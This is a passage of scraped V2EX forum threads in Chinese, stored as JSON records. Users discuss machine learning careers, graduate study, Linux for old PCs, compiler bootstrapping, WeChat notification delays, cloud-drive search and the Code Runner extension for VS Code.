"接上面没说完的话。楼主问普通程序员的价值在哪里？那我可以明确说，价值就在调参。每一个公司、每一个不同应用，都是要调参的，不可能让学术界的人在这上面浪费大量时间（他们还要研究新的结构、新的模型呢）。\r", "\r", "而调参需要很多知识，否则你只能暴力调参，吃力不讨好。所以现在的“普通程序员”是没有调参的能力的。至于怎么办？我不知道。如何培养“普通程序员的调参能力”，这需要工业界去摸索。", "干什么都脱离不了业务", "你不知道做什么，那对你来说就没价值。", "这个领域太高深，普通人能连砖都没得搬", "比如把静态分析加上机器学习，可以研究出写多少代码后就会出现大 BUG ……", "还是那句话，你懂得越少，越是觉得什么都知道。你懂得越多，越发现这简直就是伪科学。\r", "举个例子， SGD 被用了 10 几年，这东西真有什么理论基础吗？要说 paper ，早在 1950s 就有了。可是如果你拿它和 GD 、 BFGS 之流相比，你根本说不出来这东西为什么会 work ，你连优化的目标函数是什么都不一定能搞清楚。", "你要是身在此行，必定需要经常读 paper ，关注行业动态。每年那么多大会，那么多 paper 发出来，总有几篇会启发到你，需要你去尝试。这时候你需要去准备 data ，去写 code ， 去尝试你的想法。在别人那工作的好好的东西，在你这未必就有效。可能是他在撒谎，也可能是你工作做的不细致。总之，你不能坐等着，等着别人把这些都在 tensorflow 上面实现了，等着别人把一切都准备好了你只管输入几个参数点下 run 。那你就等着吧，等个 3-5 年肯定会有的。", " 我觉得随机梯度下降优化的是整体目标函数的期望，随机变量是 mini-batch 。收敛性可能不满足，但是大体思想是没错的。至于收敛性…… 有多少数学方法的收敛性在实际计算机应用的时候是仔细考量过的？差不多收敛就行了。\r", "\r", "看着像江湖骗子，和治疗癌症一样，整天都有所为新的突破，都在忽悠，\r", "\r", "不过治疗癌症能骗钱，看来机器学习也能骗钱，", "到最后就是建模优化，基本都是码农的活。\r", " \r", "寻路算法跟深度学习关系不大。", " 不要坐井底之蛙，举个看得见的技术：人脸识别， ", "我 10 年前看过人脸识别，没任何难度，有个机构采集 30000 多个样本，共享出来，这个很牛，结果全世界的阿猫阿狗带会人脸识别，没有什么实际产品，\r", "\r", "我想说人工学习的实际用途， 家里一个安全摄像头，能自动学习认识家庭成员，有陌生人时报警，\r", "\r", "这是一个非常实际的需求，现在没有一个产品，所有家庭智能产品都在偷窥你隐私，把你的数据偷偷上传，", "  你人脸识别牛，就搞个认识陌生人的摄像头，自动学习的", " 假如 batchsize 等于 1 呢？", " 我还是认为从原理上，它是符合那个期望的期望的式子的。只不过实践中，我觉得 batchsize 为 1 会导致很严重的收敛问题罢了。", " 不是。它和收敛性没有关系", " face++的在线 demo 你可以试一试。人脸识别：识别出图片中的人脸（不在训练集中的）标记出特征点，年龄等数据。你说的案例属于人脸检测，现在的应用有： iOS 的相册， Google 照片， Lightroom 。", "这么说吧，这一块科学家、研究员相当于设计师，负责想 idea ，出蓝图；程序员相当于搬砖的民工，负责把蓝图盖成大楼。", "Lz 想太多了 程序员在哪都没实际价值啊 (^0^)", " 你根本没明白，是家庭安全产品，陌生人登门时马上报警，非常急需的一个安全产品", " 广告推荐国内真没有用算法的。。都是竞价排名。。一个推荐比一个垃圾 满地都是页游广告\r", "估计最基本的关联规则都没人上", " PRML 里应该有一句，机器学习就两种算法，输出离散的叫分类，连续的叫回归。。\r", "所以某种意义上真没错。。", "我浅薄的理解，机器学习大部分还是基于统计理论，读研的时候学过，后来觉得很失望，因为并没有创新，只是计算能力和数据量的提升。现在我很怀疑自动驾驶，因为统计总有个置信度，即使可以达到 n 个 9 ，小概率事件还是有可能发生，造成灾难。", "举个例子吧， google 数据中心的能耗控制：\r", "\r", " 你说急需就急需啦，做出来有几个人会买？ 报警给谁，给你自己让你回家看还是报警给警察？ 这种产品和国外的房屋警报系统有什么区别？  在国内这个产品能有什么市场", "国内盗贼还少？这摄像头放家里，家里有陌生人，就手机发消息，这东西绝对是重新定义安全监控，", "大概程序按照原理分 2 类：\r", "\r", "I. 基于规则的（语言解释器，编译器，支付，查询，计算平台等）\r", "II. 基于 AI 算法的（语音输入，手写识别，阿法购）\r", "\r", "\r", "大部分系统都是 I 类（你不希望你按规则写的代码，被不同的编译器读出不同的意思），大部分程序员从事的也都是 I 类。即使 II 类项目，也要有大量的 I 类程序作为接口。", "机器学习套路比较深，不是李航那本蓝皮书就能概括的，起码得看懂 PRML 吧。\r", "普通做 I 类的也别想掺和了，\r", "做好 I 类， II 类的项目也需要 I 类的接口。\r", "\r", "作出稳定的 II 类系统很吃功夫的。 I 类用好就很不错的，用不着羡慕 II 类。", " 按照这个说法，人类对于环境也不过是个反馈系统，输出的是离散（现实世界不存在无限连续值）值而已。\r", " 从某种意义上人类的只能也不过是从观察到的数据中学习出来的。人类的推理本质也可以被贝叶斯公式概括。", "我理解一个是 rule based, 一个是 data driven ，但都是工具；前一个需要稳定兼容，后一个需要不断学习提升，就像一个人的身体+脑子", " 卧槽，说到心坎了。有好几篇 paper 的算法我怎么搞也弄不出来，后来都怀疑到智商问题了。还好我朋友提醒我有些 paper 有坑", " 自动驾驶的永远不是技术问题，是法律问题，没有立法搞清楚机器人驾车把人撞了算谁的，谁敢上无人驾驶\r", "都以为是 B 公司用真人做 test case 啊", "学起来需要姿势水平实在太高，入门的书都一大堆数学公式。", "机器学习是需要大量离线和在线数据的。大部分搬砖的，就是把数据从一个地方搬运到另外一个地方。然后让这些数据更加遍历于在线和离线的机器决策。这就是一个搬砖的觉悟。", " 其实我觉得神经网络入门涉及的数学不算很深，就目前来看就是普通的工科涉及的那些数学书而已，不过要在机器学习这一块有大的斩获的话数学应该是越精越好吧，早知现在会做码农的话当年专业就选数学了", "我在机器学习研究生马上毕业了，说说法国的现状吧。现在做机器学习研究有两批人，一批是统计出身的，一批是计算机搞人工智能出身的，论出文章的数量和 citation 数量，统计出身是碾压计算机出身的。研究方向的话，我的老师都在 clustring 和神经网络。机器学习最后都转化为了 optimization 问题。本科学校时的大 boss 是 optimization 大牛，现在已成法国 svm 研究方向的领军人物。现在学过了机器学习之后，觉得这个学科对计算机出身的人并没有什么先天优势（我是计算机出身），比如物理出身的搞矩阵，做模型比计算机的有先天优势，现在机器学习语言 Python 和 R 学习曲线很友好，其他出身的很容易赶上来，而 R 语言对于物理出身的来说简直就是无缝衔接（语法很像 matlab ）。对传统程序员的话，要补的东西太多了，矩阵，概率，统计，而每个机器学习模型后都是数学公式来定义的，补起来需要更长的时间。", " \r", "说到统计出身，我突然想起来王小波当年就是教统计学的，还能自己写程序"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，这是一个我和我身边小伙伴的日经问题（在校学生）。各位 V 友怎么看？</p>\n<p>限定条件是</p>\n<ol>\n<li>打算在 IT 行业工作</li>\n<li>不进国企，不做公务员</li>\n</ol>\n<p>感觉现在好多搞机器学习这方面的公司，都直接要硕士了…</p>\n</div></div>"], "reply": "55", "tittle": "打算在 IT 行业工作，研究生值得上吗？", "comment": ["你这里的最后一句话，不是给你答案了吗", " 想要一些更加综合和不同的看法。", "搞机器学习可以考虑读，那些有门槛的可以考虑,什么视觉，存储,数据库。普通开发好像价值很小", "要看漂不漂亮咯，和行业没关系", "搞 CV PR ML 相关的请直接 PhD\r", "\r", "想去硅谷的赶紧出锅\r", "\r", "想进 BAT 写代码，本科毕业足够了", "不太了解你想具体从事的具体的开发的行业，你可以去拉勾之类的互联网招聘网站看看，看看人家到底要求什么．\r", "\r", "据我所知一般的ｉｔ的行业主要是看能不能干活，活能干成什么样，对于学历的要求其实都可以适当放宽．\r", "如果有内推的话基本可以无视这个要求，当然了，能力必须也得到位啊．", "有没有本科阶段就接触 ML 之类的呢？或者考虑英国硕士 一年制硕士 时间成本更低一些(可以考虑全奖 半奖去念", "如果做 IT 工程方面的，不建议读，如果做机器学习方面的，可以考虑读，如果要精最好再去读个博，不开玩笑。", "同意 8 楼", "同意八楼。", "楼主想清楚是做 data science 还是 机器学习，这两个东西天差地别。\r", "data science 里边用得到机器学习相关的内容可能也就本科生一门大课不到的量了，去北美读个 1-1.5 年的硕士足矣。", "你们这些码农啊,too young,用到编程了就是 IT.\r", "\r", "目前所谓的机器学习,不过就是基于统计进行的估计,归根到底是数学系的人搞的.coding 只是必要的工具而已.\r", "所以要不要深造是看你数学功底行不行.和 IT 有毛关系呢", "现在硕士比本科生还要多，没个硕士都不好意思应聘了。建议还是读一个。", "我觉得挺好啊，有多少孩子能不要父母的安排的？还有人可能会说，小伙子终于掉坑里了。。。。", "如果目标不是研究性质的工作的话，我的想法是大学毕业后，做几年开发，然后再去读个 MBA 之类研究生的。", "之前有个研究生学长面人工智能，对方 boss 亲自上阵，相谈甚欢，最后告诉学长欢迎他博士毕业后再来面试。。", "搞人工智能不都要求博士了吗...", "写代码的，本科可能确实足够了。你要搞现在听上去比较火的人工智能、机器学习什么的，确实要个博士比价好。搞数据相关的，可能要求略低一点，但是统计、数学方面会有要求。", "看你 是干嘛了。\r", "\r", "大专以上就可以写代码了\r", "如果要 搞算法， 至少研究生。", "  是的。。我就搞了个 PHD ， 现在在公司的 “算法部门\" (Research Team) 里搞算法。。大数据， 机器学习。", " 说的好", "搞 IT 还是看实力，刚刚在 twitter 看到一个人的推，“在公司里看到同事用 nano 写代码，就问他，你怎么用这个啊，人家说， nano 是我搞出来的”。 最后这些大火的 ML 什么的，其实对数学的要求比较高。主要是统计，概率论要厉害，你不知道现在调参就如老中医看病了。", "程序员的趋势是越来越偏向于专业化", "基础好有意往深了搞就读，我发现自己脑子不行，估计就是码农的命，读研究生时有点后悔~", "肯定你值得上这还用问。", "内推也要看能力的吧。。。", "上♂了个研究生？(滑稽", "机器学习人工智能什么的，往深了需要的是数学博士，而不是计算机硕士。", "确定你要搞最后一句话那个的话，读\r", "不上研究生很难有机会或者主动性去发论文，参加比赛\r", "等你有几个项目，几篇水文，几个比赛，拿几个 offer 轻松（身边有实例", "我说一句话，可以不相信，可以鄙视我，你们可以骂我……\r", "\r", "不过楼上任何说 不值得 的人，要么是博士，要么不在行业内\r", "\r", "完毕", "人的一生，固然要自我奋斗，但也... 20 年后需要什么，谁也说不准。万一硕士成标配了呢", "家庭条件允许，个上人能力足够，上研究生肯定不亏", "大部分情况下 肯定是学历越高越好", "研究生请至少考虑 211 ，不然坑死。", "能读到哪种程度就读到哪种程度，学历并不是唯一，但是你要把知识学到脑子里去。", "看你以后打算进学术圈还是工业圈。前者的话，去读 phd ，后者的话，偏应用，硕士和本科差异不是很大。", "sorry ，补充一下，即便是工业圈，偏应用，无论是硕士还是本科都需要学习，都足够起步学习。\r", "我并不懂人工智能机器学习什么的，但是打算今年学一下，故在知乎上调研了一下。", "ML 推荐修一些统计类的课程，很有用的。在国内三年的时间成本也不算很高，好一点的学校老板都有资源的，跳板可能会比较高。如果想肉翻，个人建议直接去美帝读研（或者读个预科？不太懂）有几个同学在那边，有的直接读研，有的貌似转专业又读了本科。通过实习最后工作都蛮好。个人见解，仅供参考。", "本科 3 年后，读 3 年研究生，去阿里，级别 P5 ，特别优秀才 P6 。\r", "本科 3 年后，工作 3 年，去阿里，肯定 P6 。\r", "当然某些冷门技术需要在大学里深造才有机会学习，但是研究生学历根本不够看，要博士才行，最好是国外的博士。", "需要考虑到这点：工作能力和经验都可以练，学历不是你想要就能要的。", "你读完几岁？ 我 24 岁时读完 2 年半的硕士都觉得是浪费时间，你若是超过这个数字那我建议你就别读了。", "大家伙不少推荐读研的。那是不是说国内 985 211 研究生还是比较靠谱的？能天天做研究，而不是被导师拿着项目基金让你给他做项目？到底在那里的教学水不水？\r", "\r", "我也知道学历的重要性，但是在得知很多国内学校不务正业，那还不如先去工作，然后出国读研，不知道这样会不会比国内直接读研好点？", "如果你本科毕业了拿到了很好的 offer ，建议不读，否则，建议读。我现在神烦的是没读研所以毕业的时候分不够没拿到户口。现在每年续居住证的手续烦的一腿", "研究生是一个很尴尬的局面，想要 NB ，去好学校的 PHD", "你错了，搞 ML 拿着硕士只是去打杂的。起码要有个博士，最好是名校", "cmu 级别的学校读博士吧。", "不一定赶机器学习这一波行情，拿个博士学位还可以提前布局下一波行情。", "值得，反正我现在工作两年多了，越来越后悔没去上研究生", "凡是问值不值得上的都值得上。", " 写业务代码不甘心", " 可以分享一下具体是什么感受吗？", " 这种想法是为了读书而读书", "不一定要读研究生，数学够好算法就好，机器学习一样。", "1 、看你的兴趣吧，如果你的兴趣在前端，就没啥必要去读研了，如果是机器学习的话，还是可以读一读的\r", "2 、对于机器学习之类的话，去好学校 && 好导师的地方还可以，如果不是的话，还不如在网上自学呢"]},
{"content": ["<div class=\"topic_content\">爸妈家里过年买了台新电脑，原来那个用了 8 年的老电脑淘汰下来了，卖了也不值钱，索性留着吧，想在不花钱的前提下，尽可能提高使用体验。估计这个是我妈用，我妈也就看看电视剧。据说 linux 运行更加流畅，想换用，想请教下 V 友，换哪个 linux 版本更加流畅更加好用？\r<br>\r<br>配置参数：\r<br>CPU  AMD Athlon(tm) 64 Processor 3800+(2400 Mhz)\r<br>主板  联想 LENOVO\r<br>内存  2.00 GB (   400 MHz)\r<br>主硬盘  320 GB (西数 WDC WD3200AAJS-08L7A0 \r<br>显卡  ATI Radeon HD 4350 (512MB)\r<br>声卡  Realtek 888 High Definition Audio\r<br>网卡  Marvell Yukon 88E8039 PCI-E Fast Ethernet Controller</div>"], "reply": "117", "tittle": "Linux 系统哪个版本更加好用且流畅？", "comment": ["x100e 比你配置还低，之前是 xp 和 win10 分别用过一段时间，觉得很慢，途中还加了 2g 内存，后来换 ubuntu ，用了一年多了，挺好用的。父母使用一般就是上上网，看看视频、新闻，够用了。", "   仔细想想吧，用 xp/win7 才是花样作死，爸妈分分钟给它装上 360 全家桶+金山毒霸全家桶+腾讯电脑管家+......\r", "\r", "然后就没有然后了，打电话：儿呀，电脑又坏了，已经叫隔壁小李帮忙重装系统三次了，是不是电脑主机老化了？\r", "\r", "#_#\r", "\r", "楼主思路是对的，弄个垃圾软件没法自动安装的系统，最适合。", " 没有 ssd win10 还是算了吧", "发行版不是问题,感觉就是内存有点不给力\r", "可以试试 xfce4 做桌面环境.比如 xubuntu,会比 win 家族流畅多\r", "就是 flash 看视频还是挺不给力", "只想到了 remix os", "你应该问哪个桌面性能最好。然后装个升级不会跪的系统（比如 centos ）给他们用。但是一般性能好的桌面都丑。\r", "要么你给他们装个 x86 的 android 好了", "换固态硬盘后 就算装 win 也可以继续战斗", "装 win7 然后把用户权限降级成无法安装软件的那一级， Linux 桌面会折腾你父母的，听话。", "还不如 100 块卖废品，然后添 400 买个大屏手机", " 影子系统那样的网吧恢复软件不就好了，有毒瘤和操作习惯比，很多人会选择操作习惯，你想改变这种习惯对于年轻人还好，父辈的人完全用不习惯的，而且无法改过来的", "Kali Linux ，教你爸妈黑邻居密码", "买个 ipad", "- deepin linux (应该是国内一流的了)\r", "- 网站地址 ", "\r", "- 他自己的描述：高颜值、极轻减、致匠心\r", "- 国际排名： ", "只是 Linux 的话 考虑到桌面易用性 用 12 年之前的 ubuntu 吧 推荐 ubuntu 12.04 lts 应该跑的挺流畅 在早点的版本也可以", "mint mate", "家里老人用，看个剧...iPad 啊，安全可靠易用流畅耐操。", "直接装个 remixos 或者是 Phoenixos ，，方便父母上手☺"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>很喜欢 sails ，就用这个加 Angular4(不要吐槽版本了蛤蛤)写了个博客，拖来拖去写了很久，其实主要是没设计，就自己瞎想了..\n\n有兴趣的朋友可以一起来写着玩，也可以来提 issue\n目前 pc 的写了一大半，准备过年这段时间把 pc 结束掉，也希望大家提点建议，后面我想把它整合起来，写个 cli 来一键安装\n\n\n后端在 https://github.com/WittBulter/sails-blog  \n前端在 https://github.com/WittBulter/sails-blog-frontend  \n开发的测试地址在 http://test.wittsay.cc/\n\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "node(sails)+ng4 写了个博客,快写完了,有想法的朋友可以来一起写呀", "comment": ["没自适应啊，手机 Chrome 进去只能看最左边，而且动不了位置。", " 是啊，一直在开发 pc 呢", "😝😝不过现在流量都是手机，应该先做手机的😭", " \r", "不过我干什么基本只用 Web 端..手机端不习惯.\r", "\r", "辛苦了兄弟,过年还加班", "前端做的不错 学习了", "sails 快出 1.0 了, 还是再等等", "支持楼主，楼主是我朋友，春节不回家在厦门写代码，没有外卖快饿死了，希望大家多给他施舍点口粮", " 233333", "ng4 ，厉害了", " woo 记得你啊 经常知乎看你吹比 哈哈哈", "维特大佬！"]},
{"content": ["<div class=\"topic_content\">1 、只考虑通用编程语言；\r<br>2 、只针对改进的哈佛架构的两种实现 RISC 、 CISC ；\r<br>问题分为两方面：\r<br>1 、能否自举？\r<br>2 、理论上，自举是不是效率更高，编译效率和目标代码的执行效率；\r<br>\r<br>\r<br>引申问题：\r<br>语言之间的等价问题，即不考虑语言对人类的友好性，只考虑语言的表达能力和编译得到的\r<br>目标代码的执行效率，它们之间的差异是由什么因素决定的？</div>"], "reply": "9", "tittle": "语言的自举（ Bootstrapping）有什么优点？是不是其他语言实现的编译器可能从根本上没办法对该语言的某些特性进行优化，而且这种限制是不可能突破的，除非采用自举的方式？", "comment": ["只要这个语言能在物理机器上运行，就一定能用汇编写出来（实际上可不可能无所谓）", "自举是为了证明语言的表达能力，同时语言的设计者也可以通过这样一个实际的复杂的项目来验证语言的设计", "只要是图灵完全的语言（大多数都是），那就不存在表达能力的区别\r", "虽然说有怀疑图灵完全之上还有更高层次，然而一直无法证明。因此一般认为图灵完全就是表达能力最强而且相互等价\r", "论运行效率，机器码手撸编译器解释器肯定是最高的\r", "但是，因为人力有限，没必要把人的力气浪费在这种无聊的事情上，所以一般都是基于 c ，再相互补充\r", "\r", "你需要意识到一点，硬件能力不停增长，机器的能力是无穷的，而人力是有限的。只要能省人力，运行效率没多少所谓。\r", "当然也有例外，比如嵌入式、数据库、内核，这些是受当前机器能力限制的（成本、或者单线程性能），所以这些关键区域会用 C 甚至汇编写。", "> 自举是不是效率更高\r", "\r", "大多数时候不是为了编译和执行效率，而是反过来，提高开发效率。\r", "当然开发效率带动更多的优化导致执行效率提高又是另一回事。\r", "\r", "随便举个 C 的例子。\r", "假如 C 编译器全程用汇编写，那么参与开发的人必须同时是汇编和 C 的用户才行。\r", "但如果 C 编译器是用 C 写的，那么开发人员不需要通晓汇编就可以参与开发了。\r", "（用汇编来优化又是另一回事。）", "呵呵，世界上没有绝对的 cisc 和 risc ，实现指令集都已经靠微码了。", "想太多了……自举只是一种实现的风格\r", "之所以有少数情况下自举有自己的性能上的优点，那只不过是因为本身设计的时候没有把足够的接口暴露出来以至于把路堵死了", "我们知道编译器也是个不小的程序，能实际做到自举，说明语言和 (编译器实现) 在一定程度上靠谱。", "实际上没什么卵用， Go 也自举了，就 C-GO 那尿性，静态语言又缺少泛型，搞个鸡巴毛线"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>安卓机、(今年 11 分购入的某家企业的第一批手机）网络状态良好、只有手机端登录（无其他设备同时登录）\n最初，隔 3~5 分钟收到消息。以为是自家网络有问题，没注意！\n但，昨晚 12 点多和友人聊天，出现的情况是对方连续发的两句话（两家网络是正常的），两句话之间要隔 5~7 分钟收到！全程对话犹如穿越时空！\n请问各路大神，哪里导致的这种问题？望答疑、推测！</p>\n</div></div>"], "reply": "22", "tittle": "最近，手机总是不能及时接收微信消息？", "comment": ["努比亚的 z11 吧？我的就是，锁屏断流，官网很多人反映了", " 不是 。没有锁屏！没有后台！全程盯着微信", "能排除是微信的问题吗", "把软件删掉重新装", " 微信啥问题？开始以为是没更新。更新到最新版本也是一样的！", " 我重装一下！！！", "qq 正常不，看视频流畅不", "QQ 正常 视频正常 就微信不正常", " 消息太多。服务器反应迟钝。╮(‵▽′)╭", "你设置的问题，肯定锁屏后就停止了通知了。", " 楼主说了是没锁屏的情况", "上次出现这种情况 把微信移除绿色守护并保留唤醒  就好了", "iPhone 也这样", "手机砸了", "既然是全程盯着微信遇到的故障，那就不认为是应用不愿意适配 doze ，导致在 Android 7.0+的移动状态 doze 模式下吃瘪了。\r", "\r", "比较可能是 ROM 里的某些与 aosp 表现不同的刻意设置或 bug 。\r", "\r", "等下你说的是 pixel 吗？\r", "\r", "如果是 pixel ，我遇到过两种情况：\r", "1 ，移动状态下的 doze ，或应用处于 app standby 时不能联网，这个时候微信会弹出 toast 。\r", "\r", "2 ，我自己是迫使微信走了 GCM ，它断线的时候微信会收不到信息，另外会出现与 win10 版不同步的现象。\r", "\r", "\r", "QQ 正常的原因可能是它滥用了前台服务，前台服务总是能联网。", "手机品牌 国产系统名 系统版本 Android 版本？", " 如何迫使微信走 GCM", "  转自酷安\r", "绿色守护 开嗜睡模式  把微信加入绿化，把绿色守护加入系统白名单，微信不用加，在绿色守护里面添加就行\r", "*#*#426#*#*查看 gcm ，能连上的话就，去后台把微信杀了，然后用另外一个手机给微信发消息，看后台有没有微信被拉起\r", "没有反映，再注册下 GCM ：注册 GCM 的方法为：清除微信应用数据-挂 V_P_N 全局-进入微信-设置里关掉消息推送再打开就好了\r", "在*#*#426#*#*里看到了 tencent.mm 字样就说明注册成功了\r", "微信最好用 play 版本", " \r", "见楼上，基本原理应该是让微信没法在后台时联网，那么绿色守护的强制 app standby 模式或 Android 7.0+默认状态（ doze on the go ）下都能做到。", " \r", " \r", "感谢！另外我的 pixel 是 7.1.1 版本下默认就是走 GCM ？我微信是 play 版本的。", " 7.1 熄屏几分钟以后就开始第一阶段的 doze 了", "小的在这里谢过各位大神了！由于过年回家，没能参与回复。抱歉！我重新安装了一下微信，目前没发生类似情况了！春节在家用也比较少用微信。待我再观察一段！\r", "此外手机没有安装其他控制软件开启关闭的应用。后台进程限制也是手机自带的标准限制。当时手机开着的软件数并不会超过限制。以上！\r", " 手机 是锤子 M1L  系统 smartisan os V3.2.3    android 版本是 6.0.1 ！误黑 ，玻璃心。\r", "顺祝 大家新年快乐！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为什么微云 /百度云 /七牛的文件搜索一样烂？一个简单的 [文件名] 搜索，还不是全文检索，半天找不到？不科学啊。</p>\n<p>我只是搜文件名，这个很难做么？我网盘里面也没有一大堆小文件，目测 tree 一下，不到 2k 的字符串，\n居然搜得这么慢，还出不来结果？</p>\n<p>七牛就更恶心，必须搜前缀，不然绝对搜不到。（然而谁特么记得那么清楚啊！）</p>\n<p>以上说的都是纯字符搜索，不是 regex 搜索。</p>\n<p>浏览器地址栏那搜索才叫真正的搜索啊！。。。</p>\n</div></div>"], "reply": "17", "tittle": "文件名搜索这么难弄？", "comment": ["不清楚，不过我觉得苹果的 app stote 搜索弱爆了。", "感觉同一个用户的不同文件未必在一个节点上吧。也许是类似一个目录是一个对象，目录下是一些对象的索引。如果是这样的话那整颗树的元信息未必在一个地方统一维护，否则每改一个文件夹的内容还得更新元信息也挺蛋疼的，分布式事务一向蛋疼", " 哪有那么复杂……文件可以从不同的服务器取，文件名目录树应该是在一个地方的。用浏览器一个一个文件夹看都不卡，一搜索起来这么捉急我也是无语。", " 我都说了整个树不一定在一个节点上。观点我已经说明白了，剩下的我就不多说了", "服务器使用的不是目录结构的，应该是基于数据库的，表里面存的有 parentId,rootId 等等，所以你浏览目录起来速度很快。如果你要搜索，可能数据库就要跑 like 了，还是不给你们搞算了……", "七牛你当网盘用我也是醉了……", "搜索是要讲究算法的...你来写一个？\r", "学得少想得多的例子。", " 我没拿这当网盘，我只是搜一下自己的资源。", " 嚯嚯，真厉害。‘讲究算法的’。所以你觉得搜索自己网盘里文件这个需求不好实现？我学的少啥都不懂你来教我。", "这个算法真是没什么难的,不同规模有不同实现方式,几十亿记录的规模下都很简单\r", "就只是不做而已...没有为什么.....", "七牛的目标客户基本不需要搜索功能，客户会自己存 key 自己做搜索。\r", "所以七牛不存在这个功能正常。\r", "\r", "但是百度就比较奇怪了。", " 七牛当网盘分享文件时还真挺方便的。。。", " 做搜索现成的方案一大堆好吗？这种简单的 user_id + 文件名的搜索，就算几十亿规模，用 elasticsearch 也能做的很好。不做只是因为懒着做而不是不能做。", "七牛我是明白的，他们主要是面对企业用户，企业用户才不关心搜索文件这个功能，因此就是这么烂。这个纯属没有放资源在这上面。像百度云以及微云大概也是这样", "七牛只是不需要这个功能", " 小心被迅雷盯上……（流量爆表我把一个 bucket 临时设置成了私人……）", "S3 连文件 count 都得不到，号称只会在账单上出现一个估计值。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>搞了好久了\n欢迎提意见</p>\n</div></div>"], "reply": "31", "tittle": " 欢迎来访", "comment": ["讲道理 acm 题不会那么简单。。", "我的 ", "流水账", "\r", "\r", "顺便搭车", "手动 mark", "推荐一枚\r", "燃文书库 ", "为什么你们都要发地址。。。", "\r", "\r", "大家为什么都在发地址", " 正规比赛的题目是比较难，博主写的大概是他们学校用来程序设计教学的题目", " 你这个效果好棒", "\r", "大家发地址，我也来", "文章日期全是 1-27 ，好暴力，不改成写作时的日期。还是都是这一天写的？还有就是归档页面相比主页可以一页多展示点，或展示全部的。\r", "\r", "不过大家怎么都在发地址 ", "DDOS 测试员们，你们的任务来啦", "网盘搜索 ", " 搭车", "那要不要看一个难看但是可以切换中英的网站呢？ \r", "\r", "\r", "\r", "不光文字中英，图片也中英。。。可以想象人工成本， 555 ，嘻嘻嘻", "怎么你们全都在贴链接…… ", "Music \r", "\r", " 求测试哈哈", "b boy 会不会 b-box  啊", "hexo(◎-◎；)", " 搭车", " 哈哈 求测试\r", " 哈哈 求测试", "丧心病狂发地址，楼上各位还有没有节操？\r", "楼上这些丧心病狂的人类\r", "请把前端库 CDN 改成 ", "\r", "即饶你不死"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做一些小项目练练手，但是已经变懒了，纯手工打造累啊，求 Nodejs 的老司机们推荐推荐</p>\n</div></div>"], "reply": "9", "tittle": "Nodejs 下 Express 或者别的框架有 Django 那样好用的 Admin 吗？", "comment": ["试试这个？ ", "我比你更懒 \r", "\r", "直接 BaaS 代码都不想写", "直接 server less 呀", "关键字 nodejs framework", "Django 的 Admin 好用？除非你不需要定制，否则很麻烦的，包括改个界面。后台我都是自己重写。", " 做点外快挺好啊，大型的要求复杂的情况下当然自己写了。", " 具体是哪个 framework...", " 我也看到了这个，但还有别的选择吗？", "keystone"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>经过了半年的打磨，<a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.code-runner\" rel=\"nofollow\">Code Runner</a>已经支持了 27 种语言： C, C++, Java, JS, PHP, Python, Perl, Ruby, Go, Lua, Groovy, PowerShell, BAT/CMD, BASH/SH, F#, C#, VBScript, TypeScript, CoffeeScript, Scala, Swift, Julia, Crystal, OCaml, R, AppleScript, Elixir 。并且支持以下几个主要功能：</p>\n<ul>\n<li>Run code file of current active Text Editor</li>\n<li>Run selected code snippet in Text Editor</li>\n<li>Run custom command with customized parameters</li>\n<li>Stop code running</li>\n<li>View output in Output Window</li>\n<li>Set default language to run</li>\n<li>Select language to run</li>\n<li>Support REPL by running code in Integrated Terminal</li>\n</ul>\n<p><img alt=\"run code\" src=\"https://raw.githubusercontent.com/formulahendry/vscode-code-runner/master/images/usage.gif\"></p>\n<p>如果大家发现了任何 bug 或者有什么建议，欢迎来<a href=\"https://github.com/formulahendry/vscode-code-runner\" rel=\"nofollow\">GitHub</a>给我提 issue 或者 PR 。</p>\n</div></div>"], "reply": "49", "tittle": "Code Runner for VS Code, 支持运行 27 种语言 (C, C++, Java , JS, PHP , Python , Perl, Ruby, Go, Lua, Groovy, PowerShell...)", "comment": ["我还以为买的 Code Runner 又有更新了。。", "兹词 正在用😀", "可以添加一个功能，把运行结果直接替换选中的代码，就像 vim 的:'<,'>!command 。", "一直在用。支持。", "我曹 ！\r", "兹词~~", "兹词，好用！", "python 的输出不是实时的吗？测试了下是全部执行完才统一输出", "厉害了,已安装", "好厉害，是不是应该换了……", "我也以为是 Code Runner 2 。。", "比 vs go 是不是强一些呢，看看。", "在用，支持", " @", " 我们这个 Code Runner 可是免费跨平台的哦😁", " VIM 没怎么用过，能具体说下吗？比如说，运行 var a = 1 + 2 ，然后把代码替换为 var a = 3?", "Great! VSCode 自带的调试运行时太重，这个看上去就非常方便", " 对滴！而且能选择运行 code snippet ，快捷轻巧😎", "Python 输出的中文会乱码\r", "另外，不能区分 Python2 和 Python3 吗？", " \r", "关于乱码，有两个解决方法:\r", "1. 设置 PYTHONIOENCODING ，参考 ", "\r", "\"code-runner.executorMap\": {\r", "        \"python\": \"set PYTHONIOENCODING=utf8 && python\"\r", "    }\r", "2. 设置使用 built-in terminal ，参考 ", "\r", "\"code-runner.runInTerminal\": true\r", "\r", "关于区分 Python2 和 Python3 ，可以在 user settings 自定义 code-runner.executorMap ，参考 ", " 啊，谢谢  ", "  。不能把 Python2 和 3 设置为不同语言吗？因为不同的文件可能需要不同版本， 每次修改设置会比较麻烦。", " 唉， python 真的有这个问题唉，其他语言倒是能实时输出的😅不过有办法可以 workaround ，在 user settings 设置使用 ntegrated Terminal ：\r", "\"code-runner.runInTerminal\": true", " \r", "明天试试这个，开启那个 repl 也能解决", "好棒，赞赞赞", " Python2 和 3 的文件都是.py 吧？似乎并不能自动区分出来。如果只是不同的 Workspace 会用不同 python 版本，可以在 File-> Preferences->Workspace Settings 设置不同的 python 解释器，这样不知道能满足需求吗？如果在同一个 Workspace 会用不同 python 版本，可以考虑使用 custom command ：\"code-runner.customCommand\": \"python3\"", " \r", "忽略上一条吧 专门起来看了下就是用的\"code-runner.runInTerminal\": true 😅", "赞赞赞！！自己配的话太麻烦，每次开个新的都要重新弄", " 可以通过 shebang 来判断吗？", " 目前对文件类型的判断是直接调用 VS Code 的 API ， VS Code 并没有对 python 2 和 python 3 有区分。而且 